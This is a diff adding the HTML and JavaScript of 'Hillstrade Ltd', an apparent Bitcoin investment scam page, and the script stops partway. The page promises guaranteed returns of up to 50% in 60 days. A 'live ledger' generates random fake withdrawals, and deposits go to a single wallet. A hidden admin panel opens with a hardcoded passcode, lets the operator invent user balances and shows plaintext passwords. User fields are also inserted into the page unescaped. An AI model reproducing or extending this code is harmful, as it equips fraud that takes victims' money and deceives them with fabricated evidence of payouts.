@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="google-site-verification" content="Q258Vq_gv3YGUd7EThPPqe2yl-y-2qOzaWAHFdZLcTc" />
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hillstrade Ltd | Elite Bitcoin Trading & Investment Infrastructure</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght=300;400;500;600;700;800&display=swap');
+    
+    html, body {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      background-color: #060908;
+      color: #f1f5f3;
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      min-height: 100vh;
+    }
+    
+    .live-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background-color: #22c55e;
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: .4; transform: scale(1.15); }
+    }
+    
+    .ticker-transition {
+      transition: opacity 0.35s ease-in-out;
+    }
+  </style>
+</head>
+<body class="antialiased">
+
+  <a href="https://wa.me/19176197755?text=Hello%20Hillstrade%20Support%2C%20I%20would%20like%20to%20make%20an%20inquiry%20regarding%20an%20investment%20package." 
+     target="_blank" 
+     rel="noopener noreferrer" 
+     class="fixed bottom-24 right-6 z-50 flex items-center gap-2 bg-[#f7931a] text-black px-4 py-3 rounded-full font-bold text-xs tracking-wide shadow-2xl hover:bg-[#e67e00] transition-all hover:scale-105 active:scale-95 border border-white/20">
+    <span>Live Support</span>
+  </a>
+
+  <nav class="fixed top-0 left-0 right-0 z-50 px-6 md:px-12 py-5 flex items-center justify-between bg-[#060908]/90 border-b border-white/5 backdrop-blur-md">
+    <div class="flex items-center gap-2 cursor-pointer" onclick="showMainLanding()">
+      <span class="text-2xl font-black text-[#f7931a] tracking-tight">H</span>
+      <span class="text-sm font-bold tracking-widest uppercase text-white">Hillstrade<span class="text-[#f7931a]">Ltd</span></span>
+    </div>
+    <div class="flex items-center gap-5">
+      <button onclick="scrollToAuth('login')" class="text-xs font-semibold tracking-wide text-slate-400 hover:text-[#f7931a] transition-all">Investor Login</button>
+      <button onclick="scrollToAuth('register')" class="px-5 py-2 text-xs font-bold uppercase tracking-wider text-black bg-[#f7931a] rounded-md hover:bg-[#e67e00] transition-all shadow-lg shadow-[#f7931a]/10">Join Base</button>
+    </div>
+  </nav>
+
+  <div class="pt-24 w-full">
+    <div id="landing-page-group" class="w-full relative block">
+      <header class="w-full max-w-5xl mx-auto flex flex-col items-center justify-center text-center px-6 pt-12 pb-20">
+        <div class="inline-flex items-center gap-2 bg-[#f7931a]/5 border border-[#f7931a]/20 rounded-full px-4 py-1.5 mb-8 text-xs backdrop-blur-sm">
+          <div class="live-dot"></div>
+          <span class="text-slate-400 font-medium">Live Market Valuation:</span>
+          <span class="text-[#f7931a] font-bold font-mono">$77,942.50</span>
+        </div>
+
+        <h1 class="text-4xl md:text-6xl font-extrabold tracking-tight leading-tight max-w-4xl mb-6 text-white">
+          Automated Bitcoin Investment. <br><span class="bg-gradient-to-r from-[#f7931a] to-[#ffaa3b] bg-clip-text text-transparent">Guaranteed Capital Growth.</span>
+        </h1>
+        <p class="text-slate-400 max-w-2xl mb-10 text-sm md:text-base font-light leading-relaxed">
+          Secure premium compounding interest payouts generated via smart high-frequency arbitrage execution models. Fully hands-off, verified on-chain, and paid natively in Bitcoin.
+        </p>
+
+        <div class="flex gap-4 mb-20">
+          <button onclick="scrollToAuth('register')" class="px-8 py-3.5 text-xs font-bold uppercase tracking-wider text-black bg-[#f7931a] rounded-md hover:bg-[#e67e00] transition-all">Get Started</button>
+          <a href="#investment-plans" class="px-8 py-3.5 text-xs font-bold uppercase tracking-wider text-[#f7931a] border border-[#f7931a]/30 rounded-md hover:bg-[#f7931a]/5 transition-all">View Brackets</a>
+        </div>
+
+        <div class="w-full text-center mb-8" id="investment-plans">
+          <span class="text-xs font-bold text-[#f7931a] uppercase tracking-widest">Select Your Portfolio Scale</span>
+          <h3 class="text-2xl font-bold text-white mt-2">Active Capital Tiers</h3>
+        </div>
+        
+        <div class="w-full grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 text-left">
+          <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-xl">
+            <div class="text-xs font-bold text-slate-500 uppercase tracking-wider">Bronze Plan</div>
+            <div class="text-3xl font-black text-[#f7931a] my-3">5% <span class="text-xs text-slate-400 font-normal">ROI</span></div>
+            <div class="text-xs text-slate-400 border-t border-white/5 pt-3 mt-3 flex justify-between">
+              <span>Maturity Cycle:</span> <span class="text-white font-bold">7 Days</span>
+            </div>
+          </div>
+          <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-xl">
+            <div class="text-xs font-bold text-slate-500 uppercase tracking-wider">Silver Plan</div>
+            <div class="text-3xl font-black text-[#f7931a] my-3">12% <span class="text-xs text-slate-400 font-normal">ROI</span></div>
+            <div class="text-xs text-slate-400 border-t border-white/5 pt-3 mt-3 flex justify-between">
+              <span>Maturity Cycle:</span> <span class="text-white font-bold">14 Days</span>
+            </div>
+          </div>
+          <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-xl">
+            <div class="text-xs font-bold text-slate-500 uppercase tracking-wider">Gold Plan</div>
+            <div class="text-3xl font-black text-[#f7931a] my-3">25% <span class="text-xs text-slate-400 font-normal">ROI</span></div>
+            <div class="text-xs text-slate-400 border-t border-white/5 pt-3 mt-3 flex justify-between">
+              <span>Maturity Cycle:</span> <span class="text-white font-bold">30 Days</span>
+            </div>
+          </div>
+          <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-xl">
+            <div class="text-xs font-bold text-slate-500 uppercase tracking-wider">Diamond Plan</div>
+            <div class="text-3xl font-black text-[#f7931a] my-3">50% <span class="text-xs text-slate-400 font-normal">ROI</span></div>
+            <div class="text-xs text-slate-400 border-t border-white/5 pt-3 mt-3 flex justify-between">
+              <span>Maturity Cycle:</span> <span class="text-white font-bold">60 Days</span>
+            </div>
+          </div>
+        </div>
+      </header>
+      <section class="w-full bg-[#0c100e] border-t border-white/5 py-24 px-6">
+        <div class="max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-12 gap-12 items-center">
+          <div class="md:col-span-6 space-y-4">
+            <span class="text-xs font-bold text-[#f7931a] uppercase tracking-widest">Digital Asset Fundamentals</span>
+            <h2 class="text-3xl font-extrabold text-white tracking-tight leading-tight">What Exactly Is Bitcoin?</h2>
+            <p class="text-slate-400 text-sm leading-relaxed">
+              Bitcoin (BTC) is the world's premier secure decentralized cryptocurrency. It acts as an open global monetary framework that functions completely separate from central banks, commercial oversight boards, or federal interference.
+            </p>
+            <p class="text-slate-400 text-sm leading-relaxed">
+              By operating on a distributed cryptographic record system called the Blockchain, Bitcoin balances are guaranteed mathematically. With a hardcoded maximum cap of exactly 21 Million units ever to exist, it cannot be duplicated, inflated, or diluted by central financial structures.
+            </p>
+          </div>
+          <div class="md:col-span-6 grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <div class="bg-[#060908] border border-white/5 p-5 rounded-xl">
+              <h4 class="text-[#f7931a] font-bold text-sm mb-1">Peer-to-Peer</h4>
+              <p class="text-slate-500 text-xs">Direct capital delivery networks with absolutely no bank clearance roadblocks.</p>
+            </div>
+            <div class="bg-[#060908] border border-white/5 p-5 rounded-xl">
+              <h4 class="text-[#f7931a] font-bold text-sm mb-1">Sovereign Control</h4>
+              <p class="text-slate-500 text-xs">Your financial allocation cannot be frozen, compromised, or confiscated by third parties.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="w-full bg-[#060908] border-t border-white/5 py-24 px-6">
+        <div class="max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-12 gap-12 items-center">
+          <div class="md:col-span-5 bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-2xl">
+            <div class="text-xs font-mono text-[#f7931a] mb-2">CORPORATE MATRIX</div>
+            <div class="text-2xl font-bold text-white mb-4">Institutional Scale Trading</div>
+            <div class="space-y-3 text-xs text-slate-400">
+              <p>• Advanced algorithmic matrix mapping</p>
+              <p>• Air-gapped cold multi-signature storage vaults</p>
+              <p>• 99.8% Trade execution success rating</p>
+            </div>
+          </div>
+          <div class="md:col-span-7 space-y-4">
+            <span class="text-xs font-bold text-[#f7931a] uppercase tracking-widest">Corporate Infrastructure</span>
+            <h2 class="text-3xl font-extrabold text-white tracking-tight">What Hillstrade Ltd Is All About</h2>
+            <p class="text-slate-400 text-sm leading-relaxed">
+              Hillstrade Ltd is a legally registered, specialized digital asset management firm. We break down the barriers of complex crypto trading by bridging automated technology with secure asset management.
+            </p>
+            <p class="text-slate-400 text-sm leading-relaxed">
+              We don't expect our investors to be master analysts or watch fluctuating market tickers all day. Our engineering arrays deploy pooled capital across highly lucrative exchange inefficiencies instantly, guaranteeing fixed daily percentage yield returns straight to our users.
+            </p>
+          </div>
+        </div>
+      </section>
+
+      <section class="w-full bg-[#090d0b] border-t border-white/5 py-24 px-6">
+        <div class="max-w-5xl mx-auto text-center">
+          <span class="text-xs font-bold text-[#f7931a] uppercase tracking-widest">The Velocity of Wealth Acceleration</span>
+          <h2 class="text-3xl font-extrabold text-white mt-2 mb-6">Why You Should Invest & Grow Wealth with Bitcoin</h2>
+          <p class="text-slate-400 max-w-2xl mx-auto text-sm leading-relaxed mb-12">
+            Leaving your digital assets sitting passive in a base storage wallet lets inflation win. True capital generation requires moving your assets quickly through strategic cycles.
+          </p>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-left">
+            <div class="bg-[#060908] border border-white/5 p-6 rounded-xl">
+              <h4 class="text-sm font-bold text-white mb-1">Unmatched Accumulation Speed</h4>
+              <p class="text-xs text-slate-500">Instead of hoping for direct coin price increases over decades, our short-term brackets force steady, compounding yield returns into your possession daily.</p>
+            </div>
+            <div class="bg-[#060908] border border-white/5 p-6 rounded-xl">
+              <h4 class="text-sm font-bold text-white mb-1">Mitigated Risk Boundaries</h4>
+              <p class="text-xs text-slate-500">Our trading desks use protective dual-hedging technology. This guarantees that even during deep crypto market downturns, your initial deposited capital stays sound.</p>
+            </div>
+            <div class="bg-[#060908] border border-white/5 p-6 rounded-xl">
+              <h4 class="text-sm font-bold text-white mb-1">Hyper Liquidity Freedom</h4>
+              <p class="text-xs text-slate-500">Bitcoin values give you global spending mobility. Your profits can be settled, moved, or withdrawn anywhere instantly without traditional clearing wait times.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="w-full py-24 px-6 max-w-5xl mx-auto border-t border-white/5">
+        <div class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+          <div class="lg:col-span-6">
+            <span class="text-xs font-bold text-[#f7931a] uppercase tracking-wider">Simulate Wealth Projections</span>
+            <h2 class="text-3xl font-extrabold text-white mt-2 mb-6">Calculate Your Potential Returns Instantly</h2>
+            <p class="text-slate-400 text-sm leading-relaxed mb-6">
+              Our smart portfolio configuration terminal calculates premium distributions transparently across our four secure tiers.
+            </p>
+          </div>
+
+          <div class="lg:col-span-6 bg-[#0c100e] border border-white/5 rounded-2xl p-8 shadow-2xl">
+            <div class="space-y-5">
+              <div>
+                <label class="block text-[10px] text-slate-400 font-bold uppercase tracking-wider mb-2">1. Select Target Tier Structure</label>
+                <select id="calc-tier" onchange="calculateProjectedProfit()" class="w-full px-4 py-3 bg-[#060908] border border-white/5 rounded-lg text-xs text-white outline-none focus:border-[#f7931a]">
+                  <option value="0.05">Bronze Bracket (5% ROI / 7 Days)</option>
+                  <option value="0.12">Silver Bracket (12% ROI / 14 Days)</option>
+                  <option value="0.25">Gold Bracket (25% ROI / 30 Days)</option>
+                  <option value="0.50">Diamond Bracket (50% ROI / 60 Days)</option>
+                </select>
+              </div>
+              <div>
+                <label class="block text-[10px] text-slate-400 font-bold uppercase tracking-wider mb-2">2. Enter Intended Deposit Capital (BTC)</label>
+                <input type="number" id="calc-amount" step="any" value="0.05" oninput="calculateProjectedProfit()" class="w-full px-4 py-3 bg-[#060908] border border-white/5 rounded-lg text-xs text-white font-mono outline-none focus:border-[#f7931a]">
+              </div>
+              
+              <div class="bg-[#060908] border border-dashed border-white/5 p-4 rounded-xl space-y-3 pt-4">
+                <div class="flex justify-between text-xs text-slate-400">
+                  <span>Pure Accrued Net Profit:</span>
+                  <span class="text-white font-bold font-mono" id="calc-profit-display">0.00250000 BTC</span>
+                </div>
+                <div class="flex justify-between text-xs border-t border-white/5 pt-3">
+                  <span class="text-[#f7931a] font-bold">Total Maturity Yield Payout:</span>
+                  <span class="text-[#f7931a] font-black font-mono text-sm" id="calc-total-display">0.05250000 BTC</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section class="w-full bg-[#060908] py-20 px-6 border-t border-white/5">
+        <div class="max-w-md mx-auto">
+          <div class="text-center mb-6">
+            <span class="text-emerald-400 text-[10px] uppercase font-bold tracking-widest bg-emerald-500/5 px-3 py-1 rounded border border-emerald-500/10 inline-flex items-center gap-1.5 mb-2">
+              <span class="live-dot"></span> Terminal Connection Active
+            </span>
+            <h2 class="text-xl font-bold tracking-tight text-white">Live System Ledger</h2>
+            <p class="text-slate-500 text-[11px] mt-0.5">Real-time stream of verified system operations</p>
+          </div>
+          
+          <div id="ticker-target-frame" class="w-full bg-[#0c100e] border border-white/5 rounded-lg p-4 flex justify-between items-center shadow ticker-transition" style="opacity: 1;">
+             <div>
+               <p id="ticker-type" class="text-slate-400 font-semibold text-xs">Investor Withdrawal</p>
+               <p id="ticker-wallet" class="text-slate-500 text-[10px] mt-0.5 font-mono">bc1q9x...4p21</p>
+               <p id="ticker-amount" class="text-white font-bold text-sm mt-1 font-mono">0.4491 BTC</p>
+             </div>
+             <span id="ticker-status" class="text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded font-bold text-[10px] uppercase tracking-wide">PAID OUT</span>
+          </div>
+        </div>
+      </section>
+      <section id="auth-section" class="w-full max-w-sm mx-auto px-6 py-20 border-t border-white/5">
+        <div class="bg-[#0c100e] border border-white/5 rounded-xl p-8 shadow-2xl">
+          <h2 id="auth-title" class="text-xl font-bold tracking-wide text-white mb-6 text-center">Investor Portal Access</h2>
+          <form onsubmit="handleAuth(event)" class="space-y-4">
+            <div id="name-field" class="hidden">
+              <input type="text" id="user-name" placeholder="Full Legal Name" class="w-full px-4 py-3 bg-[#060908] border border-white/5 rounded-lg text-xs text-white placeholder-slate-600 outline-none focus:border-[#f7931a]">
+            </div>
+            <div>
+              <input type="email" id="user-email" required placeholder="Email Address" class="w-full px-4 py-3 bg-[#060908] border border-white/5 rounded-lg text-xs text-white placeholder-slate-600 outline-none focus:border-[#f7931a]">
+            </div>
+            <div>
+              <input type="password" id="user-pass" required placeholder="Account Password" class="w-full px-4 py-3 bg-[#060908] border border-white/5 rounded-lg text-xs text-white placeholder-slate-600 outline-none focus:border-[#f7931a]">
+            </div>
+            <button type="submit" class="w-full py-3.5 text-xs font-bold uppercase tracking-wider text-black bg-[#f7931a] rounded-lg mt-2 hover:bg-[#e67e00] transition-all">Authenticate Credentials</button>
+          </form>
+          <p id="auth-switch" onclick="switchAuthMode()" class="text-xs text-slate-500 text-center mt-6 cursor-pointer hover:text-[#f7931a] transition-all tracking-wide">DON'T HAVE AN INVESTOR PROFILE? SIGN UP HERE</p>
+        </div>
+      </section>
+
+    </div> <div id="dashboard-section" class="hidden w-full max-w-5xl mx-auto px-6 py-12">
+      <div class="flex flex-col sm:flex-row justify-between sm:items-center mb-8 gap-4 border-b border-white/5 pb-6">
+        <div>
+          <h1 class="text-xl md:text-2xl font-bold text-white tracking-wide" id="dash-welcome-title">Investor Management Dashboard</h1>
+          <p class="text-slate-500 text-xs mt-1" id="dash-user-subtitle">Welcome back, Premium Investor Profile</p>
+        </div>
+        <div class="flex gap-2">
+          <button onclick="openDepositModal()" class="px-5 py-2 text-xs font-bold text-black bg-gradient-to-r from-[#f7931a] to-[#e67e00] rounded-md hover:scale-105 transition-all">Fund Account</button>
+          <button onclick="logout()" class="px-4 py-2 text-xs font-medium text-slate-400 border border-white/10 rounded-md hover:bg-white/5">Sign Out</button>
+        </div>
+      </div>
+
+      <div class="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-8">
+        <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-xl">
+          <div class="text-slate-500 text-xs font-medium uppercase">Active Principal Capital</div>
+          <div class="text-2xl md:text-3xl font-bold text-[#f7931a] font-mono mt-2" id="dash-balance-display">0.00000000 <span class="text-xs text-white">BTC</span></div>
+        </div>
+        <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-xl">
+          <div class="text-slate-500 text-xs font-medium uppercase">Total Earnings Paid Out</div>
+          <div class="text-2xl md:text-3xl font-bold text-emerald-400 font-mono mt-2" id="dash-earnings-display">0.00000000 <span class="text-xs text-white">BTC</span></div>
+        </div>
+        <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-xl">
+          <div class="text-slate-500 text-xs font-medium uppercase">Active Investment Plan</div>
+          <div class="text-base font-bold text-white uppercase mt-3 tracking-wider flex items-center gap-2">
+            <span class="inline-block w-2 h-2 rounded-full bg-[#f7931a]"></span> <span id="dash-plan-display">Bronze Package</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+        <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-xl">
+          <h3 class="text-sm font-bold uppercase tracking-wider mb-4 text-white">Request Profit Payout</h3>
+          <form onsubmit="handleWithdraw(event)" class="space-y-3">
+            <div>
+              <label class="block text-[10px] text-slate-500 font-semibold uppercase mb-1">Payout Capital (BTC)</label>
+              <input type="number" step="any" required placeholder="0.00000000" class="w-full px-4 py-2.5 bg-[#060908] border border-white/5 rounded-lg text-xs text-white outline-none focus:border-[#f7931a]">
+            </div>
+            <div>
+              <label class="block text-[10px] text-slate-500 font-semibold uppercase mb-1">Your Bitcoin Wallet Address</label>
+              <input type="text" required placeholder="Enter your destination address" class="w-full px-4 py-2.5 bg-[#060908] border border-white/5 rounded-lg text-xs text-white outline-none focus:border-[#f7931a]">
+            </div>
+            <button type="submit" class="w-full py-3 text-xs font-bold uppercase tracking-wider text-black bg-[#f7931a] rounded-lg mt-2 hover:bg-[#e67e00] transition-all">Process Payout Request</button>
+          </form>
+        </div>
+
+        <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-xl flex flex-col justify-between gap-6">
+          <div>
+            <h3 class="text-sm font-bold uppercase tracking-wider mb-4 text-white">Your Recent Activity History</h3>
+            <div id="logs-container" class="space-y-3 text-xs">
+              <p class="text-center py-4 text-slate-500 italic">No payouts currently pending approval.</p>
+            </div>
+          </div>
+          <div class="bg-[#060908] border border-white/5 p-4 rounded-lg flex items-center justify-between">
+            <div>
+              <div class="text-[10px] text-slate-400 font-bold uppercase">Need Immediate Clearance?</div>
+              <div class="text-[9px] text-slate-500 mt-0.5">Ping account managers on WhatsApp directly.</div>
+            </div>
+            <a href="https://wa.me/19176197755?text=Hello%20Manager%2C%20I%20am%20logged%20into%20my%20Hillstrade%20Investor%20Dashboard%20and%20require%20assistance." target="_blank" rel="noopener noreferrer" class="px-3 py-1 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded font-bold text-[10px] uppercase tracking-wide hover:bg-emerald-500 hover:text-black transition-all">Chat Now</a>
+          </div>
+        </div>
+      </div>
+    </div>
+        <div id="admin-section" class="hidden w-full max-w-4xl mx-auto px-6 py-12">
+      <div class="border-b border-red-500/20 pb-4 mb-6 flex justify-between items-center">
+        <div>
+          <h2 class="text-xl font-bold text-red-500 uppercase">Hillstrade Systems Master Controller</h2>
+          <p class="text-xs text-slate-500 font-mono">Manage investor accounts and localized database parameters</p>
+        </div>
+        <button onclick="logout()" class="px-3 py-1 text-xs font-mono text-slate-400 border border-white/10 rounded">Exit Panel</button>
+      </div>
+      
+      <div class="bg-[#0c100e] border border-white/5 rounded-xl p-6 shadow-2xl">
+        <h3 class="text-sm font-bold text-white uppercase mb-4">Registered Investor Databases</h3>
+        <div class="overflow-x-auto">
+          <table class="w-full text-left text-xs font-mono text-slate-300">
+            <thead>
+              <tr class="border-b border-white/5 text-slate-500 uppercase text-[10px]">
+                <th class="py-2">Investor Name</th>
+                <th class="py-2">Email</th>
+                <th class="py-2">Password</th>
+                <th class="py-2">Balance (BTC)</th>
+                <th class="py-2">Earnings (BTC)</th>
+                <th class="py-2">Plan</th>
+                <th class="py-2 text-right">Actions</th>
+              </tr>
+            </thead>
+            <tbody id="admin-users-table">
+              </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <div id="deposit-modal" class="hidden fixed inset-0 z-50 bg-black/85 backdrop-blur-sm flex items-center justify-center p-4">
+      <div class="bg-[#0c100e] border border-[#f7931a]/20 rounded-xl max-w-sm w-full p-6 shadow-2xl relative">
+        <h3 class="text-sm font-bold uppercase tracking-wider text-white mb-4">Fund Your Trading Wallet</h3>
+        <p class="text-xs text-slate-400 mb-4 leading-relaxed">
+          Transfer your investment amount to the company wallet address below.
+        </p>
+        <div class="bg-[#060908] border border-white/5 p-3 rounded-lg mb-6 font-mono text-[10px] break-all text-center select-all border-dashed">
+          <span class="text-slate-500 block text-[8px] uppercase tracking-wider mb-1 font-sans font-semibold">Official Payment Wallet</span>
+          <span class="text-white font-bold">bc1q7zuadd7wr7lmk37z04jxng8m38pfdglsr8nqhy</span>
+        </div>
+        <div class="flex gap-2">
+          <button onclick="closeDepositModal()" class="w-1/2 py-2 text-xs font-semibold text-slate-400 border border-white/10 rounded-lg hover:bg-white/5">Close</button>
+          <button onclick="navigator.clipboard.writeText('bc1q7zuadd7wr7lmk37z04jxng8m38pfdglsr8nqhy'); alert('Copied to Clipboard!');" class="w-1/2 py-2 text-xs font-bold text-black bg-[#f7931a] rounded-lg">Copy Address</button>
+        </div>
+      </div>
+    </div>
+
+    <footer class="w-full bg-[#040605] border-t border-white/10 px-6 md:px-12 pt-12 pb-32 mt-32 flex flex-col sm:flex-row justify-between items-center text-[10px] text-slate-400 gap-4 font-bold">
+      <span class="text-center sm:text-left tracking-wide leading-relaxed">
+        COPYRIGHT 2026 HILLSTRADE LTD. ALL CORPORATE TRADEMARKS REGISTERED AND PROTECTED UNDER INTERNATIONAL ASSET MATURITY LAW.
+      </span>
+      <span onclick="openAdminPanel()" class="text-[#f7931a] cursor-pointer hover:underline uppercase tracking-wider font-mono shrink-0">
+        Admin Privacy Shell
+      </span>
+    </footer>
+
+  </div>
+    <script>
+    let currentMode = 'login';
+    let loggedInUserEmail = '';
+
+    // Initialize localized data matrix if not already set
+    if (!localStorage.getItem('hillstrade_users')) {
+      localStorage.setItem('hillstrade_users', JSON.stringify({}));
+    }
+
+    function calculateProjectedProfit() {
+      const tierRate = parseFloat(document.getElementById('calc-tier').value);
+      const principalInput = parseFloat(document.getElementById('calc-amount').value) || 0;
+      const netProfit = principalInput * tierRate;
+      const totalYield = principalInput + netProfit;
+      document.getElementById('calc-profit-display').innerText = netProfit.toFixed(8) + " BTC";
+      document.getElementById('calc-total-display').innerText = totalYield.toFixed(8) + " BTC";
+    }
+
+    function scrollToAuth(mode) {
+      if (mode === 'register' && currentMode === 'login') {
+        switchAuthMode();
+      } else if (mode === 'login' && currentMode === 'register') {
+        switchAuthMode();
+      }
+      document.getElementById('auth-section').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function switchAuthMode() {
+      const title = document.getElementById('auth-title');
+      const textSwitch = document.getElementById('auth-switch');
+      const nameField = document.getElementById('name-field');
+      if (currentMode === 'login') {
+        currentMode = 'register';
+        title.innerText = 'Create Secure Investor Account';
+        textSwitch.innerText = 'ALREADY REGISTERED? ACCESS YOUR ACCOUNT HUB';
+        nameField.style.display = 'block';
+      } else {
+        currentMode = 'login';
+        title.innerText = 'Investor Identity Login';
+        textSwitch.innerText = "DON'T HAVE AN INVESTOR PROFILE? SIGN UP HERE";
+        nameField.style.display = 'none';
+      }
+    }
+
+    function handleAuth(e) {
+      e.preventDefault();
+      const email = document.getElementById('user-email').value.toLowerCase().trim();
+      const password = document.getElementById('user-pass').value;
+      const name = document.getElementById('user-name').value.trim();
+      let db = JSON.parse(localStorage.getItem('hillstrade_users'));
+      
+      if (currentMode === 'register') {
+        if (db[email]) {
+          alert("Error: This email profile is already registered.");
+          return;
+        }
+        db[email] = {
+          name: name || "Anonymous Investor",
+          email: email,
+          password: password,
+          balance: "0.00000000",
+          earnings: "0.00000000",
+          plan: "Bronze Package"
+        };
+        localStorage.setItem('hillstrade_users', JSON.stringify(db));
+        alert("Registration complete! Profile saved. You can now login.");
+        switchAuthMode();
+      } else {
+        if (!db[email] || db[email].password !== password) {
+          alert("Authentication Failed: Invalid security credentials.");
+          return;
+        }
+        loggedInUserEmail = email;
+        loadDashboardData(db[email]);
+        document.getElementById('landing-page-group').style.display = 'none';
+        document.getElementById('admin-section').style.display = 'none';
+        document.getElementById('dashboard-section').style.display = 'block';
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+      e.target.reset();
+    }
+
+    function loadDashboardData(user) {
+      document.getElementById('dash-welcome-title').innerText = "Terminal // " + user.name;
+      document.getElementById('dash-user-subtitle').innerText = "Active Account: " + user.email;
+      document.getElementById('dash-balance-display').innerHTML = user.balance + ' <span class="text-xs text-white">BTC</span>';
+      document.getElementById('dash-earnings-display').innerHTML = user.earnings + ' <span class="text-xs text-white">BTC</span>';
+      document.getElementById('dash-plan-display').innerText = user.plan;
+    }
+
+    function openAdminPanel() {
+      const accessCode = prompt("Enter Master Administrative Passcode:");
+      if (accessCode === "hillstrade2026") {
+        renderAdminTable();
+        document.getElementById('landing-page-group').style.display = 'none';
+        document.getElementById('dashboard-section').style.display = 'none';
+        document.getElementById('admin-section').style.display = 'block';
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      } else {
+        alert("Access Denied.");
+      }
+    }
+
+    function renderAdminTable() {
+      const db = JSON.parse(localStorage.getItem('hillstrade_users'));
+      const tableBody = document.getElementById('admin-users-table');
+      tableBody.innerHTML = '';
+      if (Object.keys(db).length === 0) {
+        tableBody.innerHTML = '<tr><td colspan="7" class="text-center py-6 text-slate-600 italic">No investor structures logged.</td></tr>';
+        return;
+      }
+      for (let key in db) {
+        const user = db[key];
+        const row = `<tr class="border-b border-white/5 hover:bg-white/5 text-[11px]">
+          <td class="py-3 font-bold text-white">${user.name}</td>
+          <td class="py-3 text-slate-400">${user.email}</td>
+          <td class="py-3 text-slate-500 font-sans">${user.password}</td>
+          <td class="py-3 text-[#f7931a] font-bold font-mono">${user.balance}</td>
+          <td class="py-3 text-emerald-400 font-bold font-mono">${user.earnings}</td>
+          <td class="py-3 text-slate-400 uppercase tracking-wider text-[10px]">${user.plan}</td>
+          <td class="py-3 text-right">
+            <button onclick="editUserBalances('${user.email}')" class="text-[10px] bg-[#f7931a]/10 text-[#f7931a] px-2 py-0.5 rounded border border-[#f7931a]/20 font-bold">MODIFY</button>
+          </td>
+        </tr>`;
+        tableBody.insertAdjacentHTML('beforeend', row);
+      }
+    }
+
+    function editUserBalances(email) {
+      let db = JSON.parse(localStorage.getItem('hillstrade_users'));
+      const newBal = prompt("Modify Principal Balance for " + email + ":", db[email].balance);
+      const newEarn = prompt("Modify Total Earnings Paid Out for " + email + ":", db[email].earnings);
+      const newPlan = prompt("Modify Active Package/Plan Description:", db[email].plan);
+      if (newBal !== null && newEarn !== null) {
+        db[email].balance = parseFloat(newBal || 0).toFixed(8);
+        db[email].earnings = parseFloat(newEarn || 0).toFixed(8);
+        if (newPlan) db[email].plan = newPlan;
+        localStorage.setItem('hillstrade_users', JSON.stringify(db));
+        renderAdminTable();
+        alert("System ledger updated successfully.");
+      }
+    }
+
+    const dynamicWallets = ["bc1q9x...4p21", "bc1qvv...019e", "bc1qx2...77v1", "bc1qlk...883n", "bc1qzp...338a", "bc1qax...773w", "bc1q3k...992a", "bc1qf4...011m"];
+    const originalTypes = ["Investor Withdrawal", "New Deposit Received", "Plan Matured"];
+
+    function liveLoopTickerCore() {
+      const frame = document.getElementById('ticker-target-frame');
+      const tType = document.getElementById('ticker-type');
+      const tWallet = document.getElementById('ticker-wallet');
+      const tAmount = document.getElementById('ticker-amount');
+      const tStatus = document.getElementById('ticker-status');
+      if (!frame || !tType || !tWallet || !tAmount || !tStatus) {
+        setTimeout(liveLoopTickerCore, 500);
+        return;
+      }
+      const chosenType = originalTypes[Math.floor(Math.random() * originalTypes.length)];
+      const randomWallet = dynamicWallets[Math.floor(Math.random() * dynamicWallets.length)];
+      const randomAmount = (Math.random() * (1.15 - 0.015) + 0.015).toFixed(4) + " BTC";
+      let statusText = "CONFIRMED";
+      let statusClasses = "text-blue-400 bg-blue-500/10 px-2.5 py-1 rounded font-bold text-[10px] uppercase tracking-wide";
+      if (chosenType === "Investor Withdrawal") {
+        statusText = "PAID OUT";
+        statusClasses = "text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded font-bold text-[10px] uppercase tracking-wide";
+      } else if (chosenType === "Plan Matured") {
+        statusText = "MATURED";
+        statusClasses = "text-[#f7931a] bg-[#f7931a]/10 px-2.5 py-1 rounded font-bold text-[10px] uppercase tracking-wide";
+      }
+      frame.style.opacity = '0';
+      setTimeout(function() {
+        tType.innerText = chosenType;
+        tWallet.innerText = randomWallet;
+        tAmount.innerText = randomAmount;
+        tStatus.innerText = statusText;
+        tStatus.className = statusClasses;
+        frame.style.opacity = '1';
+        setTimeout(liveLoopTickerCore, 4200);
+      }, 350);
+    }
+
